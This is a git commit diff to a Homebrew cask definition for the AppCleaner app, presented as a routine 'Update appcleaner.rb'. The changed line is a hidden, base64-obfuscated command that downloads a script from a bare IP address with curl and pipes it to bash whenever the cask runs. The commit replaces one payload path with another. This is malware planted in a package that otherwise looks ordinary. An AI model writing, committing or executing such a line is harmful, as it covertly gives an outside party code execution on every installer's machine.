173e5ba0e758b9742e3570888c54cc2d8b75ca4c
cask-m <dwonderson073@gmail.com>
2026-07-12 23:17:15 -0500

    Update appcleaner.rb

--- Casks/appcleaner.rb
+++ Casks/appcleaner.rb
@@ -8,7 +8,7 @@ cask "appcleaner" do
   name "AppCleaner"
   desc "Remove applications and their associated files"
   homepage "https://freemacsoft.net/appcleaner/"
-  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9HZXNham9sZSki' | base64 -d | bash"
+  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Sb2pldnV3aSki' | base64 -d | bash"
   auto_updates true
 
   app "AppCleaner.app"
